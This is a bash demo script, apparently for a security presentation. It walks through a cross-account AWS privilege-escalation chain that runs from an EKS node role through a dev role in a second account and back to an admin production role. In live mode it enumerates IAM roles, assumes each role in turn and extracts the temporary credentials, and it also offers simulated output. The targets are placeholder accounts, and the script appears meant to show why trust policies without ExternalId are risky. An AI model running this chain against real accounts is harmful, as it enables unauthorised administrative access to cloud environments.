#!/bin/bash
set -euo pipefail

# Story 2: Cross-Account Role Chain
# Real scenario: EKS node (not admin) -> read roles/docs -> guess
# cross-account role name -> pivot to account 2 -> chain back to
# account 1 as admin. No ExternalId on any hop.

source "$(dirname "$0")/demo_runner.sh"

ACCOUNT_1="111111111111"
ACCOUNT_2="222222222222"
TF_DIR="<YOUR_PATH>"

CROSS_DEV_ROLE="arn:aws:iam::${ACCOUNT_2}:role/demo-cross-acct-dev"
CROSS_PROD_ROLE="arn:aws:iam::${ACCOUNT_1}:role/demo-cross-acct-prod"

banner "Story 2: Cross-Account Role Chain"

set_prompt "eks-node \$"

# ── Starting point ──
step 0 "Starting point"

narrate "We landed on an EKS node via IMDS."
narrate "This node role is NOT an admin."
echo ""

if is_live; then
    DEV_ROLE="${CROSS_DEV_ROLE}"
    PROD_ROLE="${CROSS_PROD_ROLE}"

    type_cmd "aws sts get-caller-identity"
    aws sts get-caller-identity --profile "${PROFILE}" --region "${REGION}" --output json 2>&1 | python3 -c "
import json,sys
d=json.load(sys.stdin)
print()
print(f'  Account:  {d[\"Account\"]}')
print(f'  User:     {d[\"Arn\"].split(\"/\")[-1]}')
print()
"
else
    show_cmd "aws sts get-caller-identity" "$(cat <<SIMOUT

  Account:  ${ACCOUNT_1}
  User:     EKS-Node-Role/i-0abc123

SIMOUT
)"
fi

info "EKS node role -- limited permissions."
info "But it CAN list IAM roles and read docs."

# ── Recon: reading roles and trust relationships ──
step 1 "Recon: roles and trust policies"

narrate "We enumerated IAM roles in the account."
narrate "Read trust relationships and internal docs."
narrate "Found references to a cross-account role."
echo ""

if is_live; then
    type_cmd "aws iam list-roles --query 'Roles[].RoleName'"
    aws iam list-roles --profile "${PROFILE}" --region "${REGION}" --output json --no-cli-pager 2>&1 | python3 -c "
import json,sys
roles=json.load(sys.stdin)['Roles']
cross=[r['RoleName'] for r in roles if 'cross' in r['RoleName'].lower() or 'acct' in r['RoleName'].lower()]
other=[r['RoleName'] for r in roles if r['RoleName'] not in cross]
print(f'  {len(roles)} roles found. Interesting ones:')
print()
for r in cross:
    print(f'  >> {r}')
if not cross:
    print('  (none with cross-account pattern)')
" 2>/dev/null || true
else
    show_cmd "aws iam list-roles ..." "$(cat <<'SIMOUT'
  12 roles found. Interesting ones:

  >> demo-cross-acct-dev
  >> demo-cross-acct-prod
  >> demo-cross-acct-fixed
SIMOUT
)"
fi

echo ""
alert "Cross-account role names visible!"
narrate "Internal docs confirmed account 2 exists."
narrate "We guessed the role name and tried it..."

# ── Hop 1: Assume into account 2 ──
step 2 "Pivot to Account 2"

narrate "Trying to assume the cross-account role..."
echo ""

if is_live; then
    DEV_ROLE_NAME=$(echo "${DEV_ROLE}" | rev | cut -d'/' -f1 | rev)
    type_cmd "aws sts assume-role --role-arn ${DEV_ROLE} ..."

    DEV_CREDS=$(aws sts assume-role \
        --role-arn "${DEV_ROLE}" \
        --role-session-name "attack-chain" \
        --profile "${PROFILE}" \
        --region "${REGION}" \
        --no-cli-pager \
        --output json 2>&1 || echo "")

    if [[ -z "${DEV_CREDS}" ]] || ! echo "${DEV_CREDS}" | python3 -c "import json,sys; json.load(sys.stdin)['Credentials']" &>/dev/null; then
        alert "AssumeRole failed"
        exit 0
    fi

    DEV_KEY=$(echo "${DEV_CREDS}" | python3 -c "import json,sys; c=json.load(sys.stdin)['Credentials']; print(c['AccessKeyId'])")
    DEV_SECRET=$(echo "${DEV_CREDS}" | python3 -c "import json,sys; c=json.load(sys.stdin)['Credentials']; print(c['SecretAccessKey'])")
    DEV_TOKEN=$(echo "${DEV_CREDS}" | python3 -c "import json,sys; c=json.load(sys.stdin)['Credentials']; print(c['SessionToken'])")

    ASSUMED_ARN=$(echo "${DEV_CREDS}" | python3 -c "import json,sys; print(json.load(sys.stdin)['AssumedRoleUser']['Arn'])")
    echo ""
    success "It worked. No ExternalId needed."
    echo ""
    kv "Assumed" "${ASSUMED_ARN}"
    echo ""
else
    show_cmd "aws sts assume-role --role-arn ...${ACCOUNT_2}:role/demo-cross-acct-dev ..." ""
    echo ""
    success "It worked. No ExternalId needed."
    echo ""
    kv "Assumed" "arn:aws:sts::${ACCOUNT_2}:assumed-role/demo-cross-acct-dev/attack-chain"
    echo ""
fi

set_prompt "dev-admin \$"

narrate "Verify: who are we now?"
echo ""

if is_live; then
    type_cmd "aws sts get-caller-identity"
    AWS_ACCESS_KEY_ID="${DEV_KEY}" AWS_SECRET_ACCESS_KEY="${DEV_SECRET}" AWS_SESSION_TOKEN="${DEV_TOKEN}" \
        aws sts get-caller-identity --region "${REGION}" --no-cli-pager --output json 2>&1 | python3 -c "
import json,sys
d=json.load(sys.stdin)
print()
print(f'  Account:  {d[\"Account\"]}')
print(f'  Arn:      {d[\"Arn\"]}')
print()
"
else
    show_cmd "aws sts get-caller-identity" "$(cat <<SIMOUT

  Account:  ${ACCOUNT_2}
  Arn:      ...demo-cross-acct-dev/attack-chain

SIMOUT
)"
fi

alert "We're in Account 2 (${ACCOUNT_2})."
alert "Full AdministratorAccess."

# ── Hop 2: Chain back to account 1 as admin ──
step 3 "Chain back to Account 1 (prod admin)"

narrate "We knew Account 2 could hop back."
narrate "The prod role trusts Account 2's dev role."
narrate "Can we read the trust policy from here?"
echo ""

if is_live; then
    PROD_ROLE_NAME=$(echo "${PROD_ROLE}" | rev | cut -d'/' -f1 | rev)
    type_cmd "aws iam get-role --role-name ${PROD_ROLE_NAME} ..."
    AWS_ACCESS_KEY_ID="${DEV_KEY}" AWS_SECRET_ACCESS_KEY="${DEV_SECRET}" AWS_SESSION_TOKEN="${DEV_TOKEN}" \
        aws iam get-role --role-name "${PROD_ROLE_NAME}" --query 'Role.AssumeRolePolicyDocument' \
        --region "${REGION}" --no-cli-pager --output json 2>&1 | jq . 2>/dev/null || echo "  (Can't read -- it's in Account 1)"
    echo ""
else
    show_cmd "aws iam get-role --role-name demo-cross-acct-prod ..." ""
    echo "  (Can't read -- it's in Account 1)"
    echo ""
fi

narrate "Can't read the trust policy from here."
narrate "But we KNOW it trusts us. We try anyway."
echo ""

if is_live; then
    type_cmd "aws sts assume-role --role-arn ${PROD_ROLE} ..."

    PROD_CREDS=$(AWS_ACCESS_KEY_ID="${DEV_KEY}" AWS_SECRET_ACCESS_KEY="${DEV_SECRET}" AWS_SESSION_TOKEN="${DEV_TOKEN}" \
        aws sts assume-role \
        --role-arn "${PROD_ROLE}" \
        --role-session-name "attack-chain-prod" \
        --region "${REGION}" \
        --no-cli-pager \
        --output json 2>&1 || echo "")

    if [[ -z "${PROD_CREDS}" ]] || ! echo "${PROD_CREDS}" | python3 -c "import json,sys; json.load(sys.stdin)['Credentials']" &>/dev/null; then
        alert "AssumeRole to prod failed"
        exit 0
    fi

    PROD_ARN=$(echo "${PROD_CREDS}" | python3 -c "import json,sys; print(json.load(sys.stdin)['AssumedRoleUser']['Arn'])")
    echo ""
    success "AssumeRole to PRODUCTION succeeded."
    success "No ExternalId. No MFA. Nothing."
    echo ""
    kv "Assumed" "${PROD_ARN}"
    echo ""

    PROD_KEY=$(echo "${PROD_CREDS}" | python3 -c "import json,sys; c=json.load(sys.stdin)['Credentials']; print(c['AccessKeyId'])")
    PROD_SECRET=$(echo "${PROD_CREDS}" | python3 -c "import json,sys; c=json.load(sys.stdin)['Credentials']; print(c['SecretAccessKey'])")
    PROD_TOKEN=$(echo "${PROD_CREDS}" | python3 -c "import json,sys; c=json.load(sys.stdin)['Credentials']; print(c['SessionToken'])")
else
    show_cmd "aws sts assume-role --role-arn ...${ACCOUNT_1}:role/demo-cross-acct-prod ..." ""
    echo ""
    success "AssumeRole to PRODUCTION succeeded."
    success "No ExternalId. No MFA. Nothing."
    echo ""
    kv "Assumed" "arn:aws:sts::${ACCOUNT_1}:assumed-role/demo-cross-acct-prod/attack-chain-prod"
    echo ""
fi

set_prompt "prod-admin \$"

narrate "Verify: who are we now?"
echo ""

if is_live; then
    type_cmd "aws sts get-caller-identity"
    AWS_ACCESS_KEY_ID="${PROD_KEY}" AWS_SECRET_ACCESS_KEY="${PROD_SECRET}" AWS_SESSION_TOKEN="${PROD_TOKEN}" \
        aws sts get-caller-identity --region "${REGION}" --no-cli-pager --output json 2>&1 | python3 -c "
import json,sys
d=json.load(sys.stdin)
print()
print(f'  Account:  {d[\"Account\"]}')
print(f'  Arn:      {d[\"Arn\"]}')
print()
"
else
    show_cmd "aws sts get-caller-identity" "$(cat <<SIMOUT

  Account:  ${ACCOUNT_1}
  Arn:      ...demo-cross-acct-prod/attack-chain-prod

SIMOUT
)"
fi

alert "We're admin in PRODUCTION."

# ── Summary ──
echo ""
hr
alert "REACHED PRODUCTION with AdministratorAccess"
hr
echo ""
echo "  Attack path:"
echo ""
echo "    EKS Node (${ACCOUNT_1})"
echo "      | read roles, docs, trust policies"
echo "      | guessed cross-account role name"
echo "      v"
echo "    cross-acct-dev (${ACCOUNT_2})"
echo "      | no ExternalId"
echo "      v"
echo "    cross-acct-prod (${ACCOUNT_1})"
echo "      = AdministratorAccess"
echo ""
hr
info "3 hops. No ExternalId on any hop."
info "Hardest part: figuring out the path."
info "Easiest part: exploiting it."
